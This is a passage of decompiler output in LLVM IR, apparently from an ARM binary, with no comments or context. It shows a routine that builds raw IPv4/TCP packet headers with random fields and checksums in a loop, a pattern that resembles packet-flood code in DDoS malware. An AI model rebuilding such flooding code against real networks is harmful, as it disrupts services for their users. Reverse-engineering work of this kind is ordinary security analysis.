  %v2_d764 = call i32 @_calloc(i32 128, i32 1)
  store i32 %v2_d764, i32* %r0.global-to-local, align 4
  %v3_d768 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_d768, i32* %r2.global-to-local, align 4
  %v1_d76c = load i32, i32* %fp.global-to-local, align 4
  %v2_d76c = load i32, i32* %r4.global-to-local, align 4
  %v5_d76c = mul i32 %v2_d76c, 4
  %v6_d76c = add i32 %v5_d76c, %v1_d76c
  %v7_d76c = inttoptr i32 %v6_d76c to i32*
  store i32 %v2_d764, i32* %v7_d76c, align 4
  %v0_d770 = load i32, i32* %fp.global-to-local, align 4
  %v1_d770 = load i32, i32* %r2.global-to-local, align 4
  %v4_d770 = mul i32 %v1_d770, 4
  %v5_d770 = add i32 %v4_d770, %v0_d770
  %v6_d770 = inttoptr i32 %v5_d770 to i32*
  %v7_d770 = load i32, i32* %v6_d770, align 4
  store i32 %v7_d770, i32* %r4.global-to-local, align 4
  %v1_d774 = inttoptr i32 %v7_d770 to i8*
  %v2_d774 = load i8, i8* %v1_d774, align 1
  %tmp83 = urem i8 %v2_d774, 16
  %v1_d778 = zext i8 %tmp83 to i32
  %v1_d77c = or i32 %v1_d778, 64
  store i32 %v1_d77c, i32* %r3.global-to-local, align 4
  %v1_d780 = trunc i32 %v1_d77c to i8
  store i8 %v1_d780, i8* %v1_d774, align 1
  %v0_d784 = load i32, i32* %r4.global-to-local, align 4
  %v1_d784 = inttoptr i32 %v0_d784 to i8*
  %v2_d784 = load i8, i8* %v1_d784, align 1
  %v1_d788 = and i8 %v2_d784, -16
  %v1_d78c = or i8 %v1_d788, 5
  store i32 %v1_d510, i32* %r0.global-to-local, align 4
  store i8 %v1_d78c, i8* %v1_d784, align 1
  %v2_d79c = load i32, i32* %r4.global-to-local, align 4
  %v3_d79c = add i32 %v2_d79c, 1
  %v4_d79c = inttoptr i32 %v3_d79c to i8*
  store i8 %v5_d4c8, i8* %v4_d79c, align 1
  store i32 %v4_d7a4, i32* %r2.global-to-local, align 4
  %v2_d7a8 = load i32, i32* %r4.global-to-local, align 4
  %v3_d7a8 = add i32 %v2_d7a8, 4
  %v4_d7a8 = inttoptr i32 %v3_d7a8 to i8*
  store i8 %v5_d744, i8* %v4_d7a8, align 1
  store i32 6, i32* %ip.global-to-local, align 4
  %v0_d7b4 = load i32, i32* %r0.global-to-local, align 4
  %v2_d7b4 = icmp eq i32 %v0_d7b4, 0
  store i1 %v2_d7b4, i1* %cpsr_z.global-to-local, align 1
  %v2_d7b8 = load i32, i32* %r4.global-to-local, align 4
  %v3_d7b8 = add i32 %v2_d7b8, 3
  %v4_d7b8 = inttoptr i32 %v3_d7b8 to i8*
  store i8 60, i8* %v4_d7b8, align 1
  store i32 %v4_d7bc, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_d7c4 = load i32, i32* %r2.global-to-local, align 4
  %v1_d7c4 = trunc i32 %v0_d7c4 to i8
  %v2_d7c4 = load i32, i32* %r4.global-to-local, align 4
  %v3_d7c4 = add i32 %v2_d7c4, 8
  %v4_d7c4 = inttoptr i32 %v3_d7c4 to i8*
  store i8 %v1_d7c4, i8* %v4_d7c4, align 1
  %v0_d7c8 = load i32, i32* %ip.global-to-local, align 4
  %v1_d7c8 = trunc i32 %v0_d7c8 to i8
  %v2_d7c8 = load i32, i32* %r4.global-to-local, align 4
  %v3_d7c8 = add i32 %v2_d7c8, 9
  %v4_d7c8 = inttoptr i32 %v3_d7c8 to i8*
  store i8 %v1_d7c8, i8* %v4_d7c8, align 1
  %v0_d7cc = load i32, i32* %r3.global-to-local, align 4
  %v1_d7cc = trunc i32 %v0_d7cc to i8
  %v2_d7cc = load i32, i32* %r4.global-to-local, align 4
  %v3_d7cc = add i32 %v2_d7cc, 2
  %v4_d7cc = inttoptr i32 %v3_d7cc to i8*
  store i8 %v1_d7cc, i8* %v4_d7cc, align 1
  %v3_d7d0 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_d7d0, i32* %r2.global-to-local, align 4
  %v0_d7d4 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_d7d4, label %.thread, label %bb

bb:                                               ; preds = %dec_label_pc_d75c
  store i32 64, i32* %r3.global-to-local, align 4
  %v3_d7d8 = load i32, i32* %r4.global-to-local, align 4
  %v4_d7d8 = add i32 %v3_d7d8, 6
  %v5_d7d8 = inttoptr i32 %v4_d7d8 to i8*
  store i8 64, i8* %v5_d7d8, align 1
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_d75c, %bb
  %v0_d7dc = load i32, i32* %r0.global-to-local, align 4
  %v1_d7dc = trunc i32 %v0_d7dc to i8
  %v2_d7dc = load i32, i32* %r4.global-to-local, align 4
  %v3_d7dc = add i32 %v2_d7dc, 5
  %v4_d7dc = inttoptr i32 %v3_d7dc to i8*
  store i8 %v1_d7dc, i8* %v4_d7dc, align 1
  %v0_d7e0 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_d7e0, label %.thread10, label %bb76

.thread10:                                        ; preds = %.thread
  store i32 %v6_d624, i32* %r0.global-to-local, align 4
  br label %bb77

bb76:                                             ; preds = %.thread
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %v6_d624, i32* %r0.global-to-local, align 4
  %v3_d7e8 = load i32, i32* %r4.global-to-local, align 4
  %v4_d7e8 = add i32 %v3_d7e8, 7
  %v5_d7e8 = inttoptr i32 %v4_d7e8 to i8*
  store i8 0, i8* %v5_d7e8, align 1
  %v0_d7f0.pre = load i32, i32* %r0.global-to-local, align 4
  br label %bb77

bb77:                                             ; preds = %.thread10, %bb76
  %v0_d7f0 = phi i32 [ %v6_d624, %.thread10 ], [ %v0_d7f0.pre, %bb76 ]
  %v0_d7ec = load i32, i32* %r2.global-to-local, align 4
  %v3_d7ec = mul i32 %v0_d7ec, 32
  store i32 %v3_d7ec, i32* %r3.global-to-local, align 4
  %v1_d7f0 = load i32, i32* %r4.global-to-local, align 4
  %v2_d7f0 = add i32 %v1_d7f0, 12
  %v3_d7f0 = inttoptr i32 %v2_d7f0 to i32*
  store i32 %v0_d7f0, i32* %v3_d7f0, align 4
  %v0_d7f4 = load i32, i32* %r3.global-to-local, align 4
  %v1_d7f4 = load i32, i32* %r2.global-to-local, align 4
  %tmp84 = mul i32 %v1_d7f4, -8
  %v5_d7f4 = add i32 %v0_d7f4, %tmp84
  %v1_d7f8 = load i32, i32* @r8, align 4
  %v2_d7f8 = add i32 %v1_d7f8, %v5_d7f4
  store i32 %v2_d7f8, i32* %r3.global-to-local, align 4
  %v1_d7fc = add i32 %v2_d7f8, 16
  %v2_d7fc = inttoptr i32 %v1_d7fc to i32*
  %v3_d7fc = load i32, i32* %v2_d7fc, align 4
  store i32 %v3_d7fc, i32* %r2.global-to-local, align 4
  %v0_d800 = load i32, i32* %r7.global-to-local, align 4
  %v1_d800 = trunc i32 %v0_d800 to i8
  %v2_d800 = load i32, i32* %r4.global-to-local, align 4
  %v3_d800 = add i32 %v2_d800, 20
  %v4_d800 = inttoptr i32 %v3_d800 to i8*
  store i8 %v1_d800, i8* %v4_d800, align 1
  %v0_d804 = load i32, i32* %r2.global-to-local, align 4
  %v1_d804 = load i32, i32* %r4.global-to-local, align 4
  %v2_d804 = add i32 %v1_d804, 16
  %v3_d804 = inttoptr i32 %v2_d804 to i32*
  store i32 %v0_d804, i32* %v3_d804, align 4
  %v0_d808 = load i32, i32* %r4.global-to-local, align 4
  %v1_d808 = add i32 %v0_d808, 20
  store i32 %v1_d808, i32* %r1.global-to-local, align 4
  %v1_d80c = add i32 %v0_d808, 33
  %v2_d80c = inttoptr i32 %v1_d80c to i8*
  %v3_d80c = load i8, i8* %v2_d80c, align 1
  %v4_d80c = zext i8 %v3_d80c to i32
  store i32 %v1_d6f4, i32* %r2.global-to-local, align 4
  %v1_d814 = and i32 %v4_d80c, 223
  %v5_d818 = or i32 %v1_d814, %v4_d818
  store i32 %v5_d818, i32* %r3.global-to-local, align 4
  %v1_d81c = trunc i32 %v5_d818 to i8
  store i8 %v1_d81c, i8* %v2_d80c, align 1
  %v0_d820 = load i32, i32* %r1.global-to-local, align 4
  %v1_d820 = add i32 %v0_d820, 13
  %v2_d820 = inttoptr i32 %v1_d820 to i8*
  %v3_d820 = load i8, i8* %v2_d820, align 1
  %v4_d820 = zext i8 %v3_d820 to i32
  store i32 %v1_d6fc, i32* %r3.global-to-local, align 4
  %v1_d828 = and i32 %v4_d820, 239
  %v5_d82c = or i32 %v1_d828, %v4_d82c
  store i32 %v5_d82c, i32* %r2.global-to-local, align 4
  %v1_d830 = trunc i32 %v5_d82c to i8
  store i8 %v1_d830, i8* %v2_d820, align 1
  %v0_d834 = load i32, i32* %r1.global-to-local, align 4
  %v1_d834 = add i32 %v0_d834, 13
  %v2_d834 = inttoptr i32 %v1_d834 to i8*
  %v3_d834 = load i8, i8* %v2_d834, align 1
  %v4_d834 = zext i8 %v3_d834 to i32
  store i32 %v1_d71c, i32* %ip.global-to-local, align 4
  %v1_d83c = and i32 %v4_d834, 247
  %v5_d840 = or i32 %v1_d83c, %v4_d840
  store i32 %v5_d840, i32* %r3.global-to-local, align 4
  %v1_d844 = trunc i32 %v5_d840 to i8
  store i8 %v1_d844, i8* %v2_d834, align 1
  %v0_d848 = load i32, i32* %r1.global-to-local, align 4
  %v1_d848 = add i32 %v0_d848, 13
  %v2_d848 = inttoptr i32 %v1_d848 to i8*
  %v3_d848 = load i8, i8* %v2_d848, align 1
  %v4_d848 = zext i8 %v3_d848 to i32
  store i32 %v1_d720, i32* %r0.global-to-local, align 4
  %v1_d850 = and i32 %v4_d848, 251
  %v5_d854 = or i32 %v1_d850, %v4_d854
  store i32 %v5_d854, i32* %r2.global-to-local, align 4
  %v1_d858 = trunc i32 %v5_d854 to i8
  store i8 %v1_d858, i8* %v2_d848, align 1
  %v0_d85c = load i32, i32* %r1.global-to-local, align 4
  %v1_d85c = add i32 %v0_d85c, 13
  %v2_d85c = inttoptr i32 %v1_d85c to i8*
  %v3_d85c = load i8, i8* %v2_d85c, align 1
  %v4_d85c = zext i8 %v3_d85c to i32
  store i32 %v1_d724, i32* %r2.global-to-local, align 4
  %v1_d864 = and i32 %v4_d85c, 253
  %v4_d868 = or i32 %v1_d864, %v3_d868
  store i32 %v4_d868, i32* %r3.global-to-local, align 4
  %v1_d86c = trunc i32 %v4_d868 to i8
  store i8 %v1_d86c, i8* %v2_d85c, align 1
  %v0_d870 = load i32, i32* %r1.global-to-local, align 4
  %v1_d870 = add i32 %v0_d870, 12
  %v2_d870 = inttoptr i32 %v1_d870 to i8*
  %v3_d870 = load i8, i8* %v2_d870, align 1
  %v4_d870 = zext i8 %v3_d870 to i32
  store i32 %v4_d870, i32* %r2.global-to-local, align 4
  %v1_d874 = add i32 %v0_d870, 13
  %v2_d874 = inttoptr i32 %v1_d874 to i8*
  %v3_d874 = load i8, i8* %v2_d874, align 1
  %v4_d874 = zext i8 %v3_d874 to i32
  %tmp85 = urem i8 %v3_d870, 16
  %v1_d87c = zext i8 %tmp85 to i32
  %v1_d880 = and i32 %v4_d874, 254
  %v2_d884 = or i32 %v1_d880, %v1_d734
  %v1_d888 = or i32 %v1_d87c, 160
  store i32 %v1_d888, i32* %r2.global-to-local, align 4
  %v1_d88c = trunc i32 %v2_d884 to i8
  store i8 %v1_d88c, i8* %v2_d874, align 1
  %v0_d890 = load i32, i32* %r2.global-to-local, align 4
  %v1_d890 = trunc i32 %v0_d890 to i8
  %v2_d890 = load i32, i32* %r1.global-to-local, align 4
  %v3_d890 = add i32 %v2_d890, 12
  %v4_d890 = inttoptr i32 %v3_d890 to i8*
  store i8 %v1_d890, i8* %v4_d890, align 1
  store i32 %v3_d898, i32* %r0.global-to-local, align 4
  store i32 %v7_d898, i32* %r2.global-to-local, align 4
  store i32 4, i32* %ip.global-to-local, align 4
  store i32 2, i32* %r3.global-to-local, align 4
  %v2_d8a4 = load i32, i32* %r1.global-to-local, align 4
  %v3_d8a4 = add i32 %v2_d8a4, 3
  %v4_d8a4 = inttoptr i32 %v3_d8a4 to i8*
  store i8 %v5_d754, i8* %v4_d8a4, align 1
  %v0_d8a8 = load i32, i32* %r0.global-to-local, align 4
  %v1_d8a8 = trunc i32 %v0_d8a8 to i8
  %v2_d8a8 = load i32, i32* %r1.global-to-local, align 4
  %v3_d8a8 = add i32 %v2_d8a8, 1
  %v4_d8a8 = inttoptr i32 %v3_d8a8 to i8*
  store i8 %v1_d8a8, i8* %v4_d8a8, align 1
  %v0_d8ac = load i32, i32* %r6.global-to-local, align 4
  %v1_d8ac = trunc i32 %v0_d8ac to i8
  %v2_d8ac = load i32, i32* %r1.global-to-local, align 4
  %v3_d8ac = add i32 %v2_d8ac, 2
  %v4_d8ac = inttoptr i32 %v3_d8ac to i8*
  store i8 %v1_d8ac, i8* %v4_d8ac, align 1
  %v0_d8b0 = load i32, i32* %r5.global-to-local, align 4
  %v1_d8b0 = load i32, i32* %r1.global-to-local, align 4
  %v2_d8b0 = add i32 %v1_d8b0, 4
  %v3_d8b0 = inttoptr i32 %v2_d8b0 to i32*
  store i32 %v0_d8b0, i32* %v3_d8b0, align 4
  %v0_d8b4 = load i32, i32* %ip.global-to-local, align 4
  %v1_d8b4 = trunc i32 %v0_d8b4 to i8
  %v2_d8b4 = load i32, i32* %r4.global-to-local, align 4
  %v3_d8b4 = add i32 %v2_d8b4, 41
  %v4_d8b4 = inttoptr i32 %v3_d8b4 to i8*
  store i8 %v1_d8b4, i8* %v4_d8b4, align 1
  %v0_d8b8 = load i32, i32* %r3.global-to-local, align 4
  %v1_d8b8 = trunc i32 %v0_d8b8 to i8
  %v2_d8b8 = load i32, i32* %r4.global-to-local, align 4
  %v3_d8b8 = add i32 %v2_d8b8, 40
  %v4_d8b8 = inttoptr i32 %v3_d8b8 to i8*
  store i8 %v1_d8b8, i8* %v4_d8b8, align 1
  %v0_d8bc = call i32 @function_10bd8()
  %v1_d8c0 = mul i32 %v0_d8bc, 256
  %v1_d8c4 = and i32 %v1_d8c0, 3840
  %v1_d8c8 = or i32 %v1_d8c4, 356352
  %v3_d8d0 = add nuw nsw i32 %v1_d8c8, 2048
  %v1_d8d4 = and i32 %v3_d8d0, ptrtoint (i32* @global_var_ff00.79 to i32)
  %v3_d8dc8 = udiv i32 %v1_d8d4, 256
  store i32 %v3_d8dc8, i32* %r1.global-to-local, align 4
  %v0_d8e0 = load i32, i32* %r4.global-to-local, align 4
  %v1_d8e0 = add i32 %v0_d8e0, 42
  store i32 %v1_d8e0, i32* %r2.global-to-local, align 4
  %v4_d8e4 = inttoptr i32 %v1_d8e0 to i8*
  store i8 5, i8* %v4_d8e4, align 1
  %v0_d8e8 = load i32, i32* %r1.global-to-local, align 4
  %v1_d8e8 = trunc i32 %v0_d8e8 to i8
  %v2_d8e8 = load i32, i32* %r2.global-to-local, align 4
  %v3_d8e8 = add i32 %v2_d8e8, 1
  %v4_d8e8 = inttoptr i32 %v3_d8e8 to i8*
  store i8 %v1_d8e8, i8* %v4_d8e8, align 1
  store i32 8, i32* %r3.global-to-local, align 4
  %v2_d8f4 = load i32, i32* %r4.global-to-local, align 4
  %v3_d8f4 = add i32 %v2_d8f4, 47
  %v4_d8f4 = inttoptr i32 %v3_d8f4 to i8*
  store i8 10, i8* %v4_d8f4, align 1
  store i32 4, i32* %r0.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v0_d900 = load i32, i32* %r3.global-to-local, align 4
  %v1_d900 = trunc i32 %v0_d900 to i8
  %v2_d900 = load i32, i32* %r4.global-to-local, align 4
  %v3_d900 = add i32 %v2_d900, 46
  %v4_d900 = inttoptr i32 %v3_d900 to i8*
  store i8 %v1_d900, i8* %v4_d900, align 1
  %v0_d904 = load i32, i32* %r2.global-to-local, align 4
  %v1_d904 = trunc i32 %v0_d904 to i8
  %v2_d904 = load i32, i32* %r4.global-to-local, align 4
  %v3_d904 = add i32 %v2_d904, 45
  %v4_d904 = inttoptr i32 %v3_d904 to i8*
  store i8 %v1_d904, i8* %v4_d904, align 1
  %v0_d908 = load i32, i32* %r0.global-to-local, align 4
  %v1_d908 = trunc i32 %v0_d908 to i8
  %v2_d908 = load i32, i32* %r4.global-to-local, align 4
  %v3_d908 = add i32 %v2_d908, 44
  %v4_d908 = inttoptr i32 %v3_d908 to i8*
  store i8 %v1_d908, i8* %v4_d908, align 1
  %v0_d90c = call i32 @function_10bd8()
  store i32 %v0_d90c, i32* %r0.global-to-local, align 4
  %v2_d914 = load i32, i32* %r4.global-to-local, align 4
  %v3_d914 = add i32 %v2_d914, 56
  %v4_d914 = inttoptr i32 %v3_d914 to i8*
  store i8 1, i8* %v4_d914, align 1
  store i32 3, i32* %r2.global-to-local, align 4
  store i32 6, i32* %r3.global-to-local, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  %v1_d924 = load i32, i32* %r4.global-to-local, align 4
  %v2_d924 = add i32 %v1_d924, 48
  %v3_d924 = inttoptr i32 %v2_d924 to i32*
  store i32 %v0_d90c, i32* %v3_d924, align 4
  %v0_d928 = load i32, i32* %r2.global-to-local, align 4
  %v1_d928 = trunc i32 %v0_d928 to i8
  %v2_d928 = load i32, i32* %r4.global-to-local, align 4
  %v3_d928 = add i32 %v2_d928, 58
  %v4_d928 = inttoptr i32 %v3_d928 to i8*
  store i8 %v1_d928, i8* %v4_d928, align 1
  %v0_d92c = load i32, i32* %r3.global-to-local, align 4
  %v1_d92c = trunc i32 %v0_d92c to i8
  %v2_d92c = load i32, i32* %r4.global-to-local, align 4
  %v3_d92c = add i32 %v2_d92c, 59
  %v4_d92c = inttoptr i32 %v3_d92c to i8*
  store i8 %v1_d92c, i8* %v4_d92c, align 1
  %v0_d930 = load i32, i32* %ip.global-to-local, align 4
  %v1_d930 = load i32, i32* %r4.global-to-local, align 4
  %v2_d930 = add i32 %v1_d930, 52
  %v3_d930 = inttoptr i32 %v2_d930 to i32*
  store i32 %v0_d930, i32* %v3_d930, align 4
  %v0_d934 = load i32, i32* %r2.global-to-local, align 4
  %v1_d934 = trunc i32 %v0_d934 to i8
  %v2_d934 = load i32, i32* %r4.global-to-local, align 4
  %v3_d934 = add i32 %v2_d934, 57
  %v4_d934 = inttoptr i32 %v3_d934 to i8*
  store i8 %v1_d934, i8* %v4_d934, align 1
  %v3_d938 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_d938, i32* %r3.global-to-local, align 4
  %v1_d93c = add i32 %v3_d938, 1
  store i32 %v1_d93c, i32* %r4.global-to-local, align 4
  %v0_d940 = load i32, i32* @sl, align 4
  %v9_d940 = icmp eq i32 %v0_d940, %v1_d93c
  store i1 %v9_d940, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_d93c, i32* %stack_var_-40, align 4
  %v8_d948 = icmp sgt i32 %v0_d940, %v1_d93c
  br i1 %v8_d948, label %dec_label_pc_d75c, label %dec_label_pc_d94c

dec_label_pc_d94c:                                ; preds = %bb77, %dec_label_pc_d670
  %v0_d94c = phi i32 [ %v0_d69c, %dec_label_pc_d670 ], [ %v0_d940, %bb77 ]
  %v2_d94c = icmp eq i32 %v0_d94c, 0
  store i1 %v2_d94c, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_db04 = icmp eq i32 %v3_d68c, 65535
  %v2_db80 = icmp eq i32 %v1_d698, 0
  %v2_d988 = icmp eq i32 %v6_d624, -1
  %v7_d988 = icmp eq i32 %v6_d624, -1
  br label %dec_label_pc_d954.outer

dec_label_pc_d954.outer:                          ; preds = %dec_label_pc_da80, %dec_label_pc_d94c
  %v1_d954.ph.in = phi i32 [ %v0_da74, %dec_label_pc_da80 ], [ %v0_d94c, %dec_label_pc_d94c ]
  %v0_d954.ph = phi i1 [ %v2_da80, %dec_label_pc_da80 ], [ %v2_d94c, %dec_label_pc_d94c ]
  %v1_d954.ph = icmp slt i32 %v1_d954.ph.in, 0
  %v4_d954 = or i1 %v1_d954.ph, %v0_d954.ph
  br label %dec_label_pc_d954

dec_label_pc_d954:                                ; preds = %dec_label_pc_d954.outer, %dec_label_pc_d954
  br i1 %v4_d954, label %dec_label_pc_d954, label %dec_label_pc_d958

dec_label_pc_d958:                                ; preds = %dec_label_pc_d954
  store i32 0, i32* %stack_var_-40, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_d964

dec_label_pc_d964:                                ; preds = %dec_label_pc_d9e0, %dec_label_pc_d958
  %v1_d974 = phi i32 [ %v1_da70, %dec_label_pc_d9e0 ], [ 0, %dec_label_pc_d958 ]
  %v5_d968 = mul i32 %v1_d974, 24
  %v1_d96c = load i32, i32* @r8, align 4
  %v2_d96c = add i32 %v1_d96c, %v5_d968
  store i32 %v2_d96c, i32* %r3.global-to-local, align 4
  %v1_d970 = add i32 %v2_d96c, 20
  %v2_d970 = inttoptr i32 %v1_d970 to i8*
  %v3_d970 = load i8, i8* %v2_d970, align 1
  %v4_d970 = zext i8 %v3_d970 to i32
  store i32 %v4_d970, i32* %r2.global-to-local, align 4
  %v0_d974 = load i32, i32* %fp.global-to-local, align 4
  %v4_d974 = mul i32 %v1_d974, 4
  %v5_d974 = add i32 %v0_d974, %v4_d974
  %v6_d974 = inttoptr i32 %v5_d974 to i32*
  %v7_d974 = load i32, i32* %v6_d974, align 4
  store i32 %v7_d974, i32* @r5, align 4
  %v7_d978 = icmp eq i8 %v3_d970, 31
  store i1 %v7_d978, i1* %cpsr_z.global-to-local, align 1
  %v1_d97c = add i32 %v7_d974, 20
  store i32 %v1_d97c, i32* @r6, align 4
  %tmp86 = icmp ult i8 %v3_d970, 32
  br i1 %tmp86, label %dec_label_pc_da8c, label %dec_label_pc_d984

dec_label_pc_d984:                                ; preds = %dec_label_pc_d964
  store i32 %v6_d624, i32* %r0.global-to-local, align 4
  store i1 %v7_d988, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_d988, label %dec_label_pc_daf4, label %dec_label_pc_d990

dec_label_pc_d990:                                ; preds = %dec_label_pc_da8c, %dec_label_pc_d984
  store i32 %v3_d68c, i32* %r2.global-to-local, align 4
  store i32 65535, i32* @r4, align 4
  store i1 %v3_db04, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_db04, label %dec_label_pc_db10, label %dec_label_pc_d9a4

dec_label_pc_d9a4:                                ; preds = %dec_label_pc_daf4.dec_label_pc_d9a4_crit_edge, %dec_label_pc_d990
  %v1_d9a8 = phi i32 [ %v1_d9a8.pre, %dec_label_pc_daf4.dec_label_pc_d9a4_crit_edge ], [ 65535, %dec_label_pc_d990 ]
  store i32 %v3_d690, i32* %r3.global-to-local, align 4
  %v9_d9a8 = icmp eq i32 %v3_d690, %v1_d9a8
  store i1 %v9_d9a8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_d9a8, label %dec_label_pc_db2c, label %dec_label_pc_d9b0

dec_label_pc_d9b0:                                ; preds = %dec_label_pc_db10.dec_label_pc_d9b0_crit_edge, %dec_label_pc_d9a4
  %v1_d9b4 = phi i32 [ %v1_d9b4.pre, %dec_label_pc_db10.dec_label_pc_d9b0_crit_edge ], [ %v1_d9a8, %dec_label_pc_d9a4 ]
  store i32 %v3_d694, i32* %ip.global-to-local, align 4
  %v9_d9b4 = icmp eq i32 %v3_d694, %v1_d9b4
  store i1 %v9_d9b4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_d9b4, label %dec_label_pc_db48, label %dec_label_pc_d9bc

dec_label_pc_d9bc:                                ; preds = %dec_label_pc_db2c.dec_label_pc_d9bc_crit_edge, %dec_label_pc_d9b0
  %v1_d9c0 = phi i32 [ %v1_d9c0.pre, %dec_label_pc_db2c.dec_label_pc_d9bc_crit_edge ], [ %v1_d9b4, %dec_label_pc_d9b0 ]
  store i32 %v5_d560, i32* %r0.global-to-local, align 4
  %v9_d9c0 = icmp eq i32 %v5_d560, %v1_d9c0
  store i1 %v9_d9c0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_d9c0, label %dec_label_pc_db64, label %dec_label_pc_d9c8

dec_label_pc_d9c8:                                ; preds = %dec_label_pc_db48.dec_label_pc_d9c8_crit_edge, %dec_label_pc_d9bc
  %v1_d9cc = phi i32 [ %v1_d9cc.pre, %dec_label_pc_db48.dec_label_pc_d9c8_crit_edge ], [ %v1_d9c0, %dec_label_pc_d9bc ]
  store i32 %v6_d578, i32* %r2.global-to-local, align 4
  %v9_d9cc = icmp eq i32 %v6_d578, %v1_d9cc
  store i1 %v9_d9cc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_d9cc, label %dec_label_pc_db78, label %dec_label_pc_d9d4

dec_label_pc_d9d4:                                ; preds = %dec_label_pc_db64, %dec_label_pc_d9c8
  store i32 %v1_d698, i32* %r3.global-to-local, align 4
  store i1 %v2_db80, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_db80, label %dec_label_pc_d9e0, label %dec_label_pc_db8c

dec_label_pc_d9e0:                                ; preds = %dec_label_pc_d9d4, %dec_label_pc_db78, %dec_label_pc_db8c
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_d9e4 = load i32, i32* %r7.global-to-local, align 4
  %v1_d9e4 = trunc i32 %v0_d9e4 to i8
  %v2_d9e4 = load i32, i32* @r5, align 4
  %v3_d9e4 = add i32 %v2_d9e4, 10
  %v4_d9e4 = inttoptr i32 %v3_d9e4 to i8*
  store i8 %v1_d9e4, i8* %v4_d9e4, align 1
  %v0_d9e8 = load i32, i32* %r7.global-to-local, align 4
  %v1_d9e8 = trunc i32 %v0_d9e8 to i8
  %v2_d9e8 = load i32, i32* @r5, align 4
  %v3_d9e8 = add i32 %v2_d9e8, 11
  %v4_d9e8 = inttoptr i32 %v3_d9e8 to i8*
  store i8 %v1_d9e8, i8* %v4_d9e8, align 1
  %v0_d9ec = load i32, i32* @r5, align 4
  store i32 %v0_d9ec, i32* @r0, align 4
  %v2_d9f0 = call i32 @function_f19c(i32 %v0_d9ec, i32 20)
  %v3_d9f0 = trunc i32 %v2_d9f0 to i8
  %v4_d9f428 = udiv i32 %v2_d9f0, 256
  %v1_d9f8 = trunc i32 %v4_d9f428 to i8
  %v2_d9f8 = load i32, i32* @r5, align 4
  %v3_d9f8 = add i32 %v2_d9f8, 11
  %v4_d9f8 = inttoptr i32 %v3_d9f8 to i8*
  store i8 %v1_d9f8, i8* %v4_d9f8, align 1
  %v3_d9fc = load i32, i32* @r5, align 4
  %v4_d9fc = add i32 %v3_d9fc, 10
  %v5_d9fc = inttoptr i32 %v4_d9fc to i8*
  store i8 %v3_d9f0, i8* %v5_d9fc, align 1
  %v0_da00 = load i32, i32* @r6, align 4
  store i32 %v0_da00, i32* @r1, align 4
  store i32 10240, i32* %r2.global-to-local, align 4
  store i32 40, i32* %r3.global-to-local, align 4
  %v0_da0c = load i32, i32* %r7.global-to-local, align 4
  %v1_da0c = trunc i32 %v0_da0c to i8
  %v3_da0c = add i32 %v0_da00, 16
  %v4_da0c = inttoptr i32 %v3_da0c to i8*
  store i8 %v1_da0c, i8* %v4_da0c, align 1
  %v0_da10 = load i32, i32* %r7.global-to-local, align 4
  %v1_da10 = trunc i32 %v0_da10 to i8
  %v2_da10 = load i32, i32* @r6, align 4
  %v3_da10 = add i32 %v2_da10, 17
  %v4_da10 = inttoptr i32 %v3_da10 to i8*
  store i8 %v1_da10, i8* %v4_da10, align 1
  %v0_da14 = load i32, i32* @r5, align 4
  store i32 %v0_da14, i32* %r0.global-to-local, align 4
  %v4_da18 = call i32 @function_f1f8(i32 %v0_da14, i32 %v0_da00, i32 10240, i32 40)
  %v5_da18 = trunc i32 %v4_da18 to i8
  store i32 %v4_da18, i32* %r0.global-to-local, align 4
  %v4_da1c29 = udiv i32 %v4_da18, 256
  %v1_da20 = trunc i32 %v4_da1c29 to i8
  %v2_da20 = load i32, i32* @r6, align 4
  %v3_da20 = add i32 %v2_da20, 17
  %v4_da20 = inttoptr i32 %v3_da20 to i8*
  store i8 %v1_da20, i8* %v4_da20, align 1
  %v3_da24 = load i32, i32* @r6, align 4
  %v4_da24 = add i32 %v3_da24, 16
  %v5_da24 = inttoptr i32 %v4_da24 to i8*
  store i8 %v5_da18, i8* %v5_da24, align 1
  %v3_da28 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_da28, i32* %r3.global-to-local, align 4
  %v0_da2c = load i32, i32* @r5, align 4
  %v1_da2c = add i32 %v0_da2c, 20
  %v2_da2c = inttoptr i32 %v1_da2c to i32*
  %v3_da2c = load i32, i32* %v2_da2c, align 4
  %v3_da34 = udiv i32 %v3_da2c, 65536
  store i32 %v3_da34, i32* %r2.global-to-local, align 4
  %v5_da38 = mul i32 %v3_da28, 24
  %v1_da3c = load i32, i32* @r8, align 4
  %v2_da3c = add i32 %v1_da3c, %v5_da38
  store i32 %v2_da3c, i32* %ip.global-to-local, align 4
  %v3_da4027 = udiv i32 %v3_da2c, 16777216
  %v1_da44 = trunc i32 %v3_da4027 to i8
  %v3_da44 = add i32 %v2_da3c, 3
  %v4_da44 = inttoptr i32 %v3_da44 to i8*
  store i8 %v1_da44, i8* %v4_da44, align 1
  %v0_da48 = load i32, i32* %r2.global-to-local, align 4
  %v1_da48 = trunc i32 %v0_da48 to i8
  %v2_da48 = load i32, i32* %ip.global-to-local, align 4
  %v3_da48 = add i32 %v2_da48, 2
  %v4_da48 = inttoptr i32 %v3_da48 to i8*
  store i8 %v1_da48, i8* %v4_da48, align 1
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_da50 = load i32, i32* @r5, align 4
  store i32 %v0_da50, i32* %r1.global-to-local, align 4
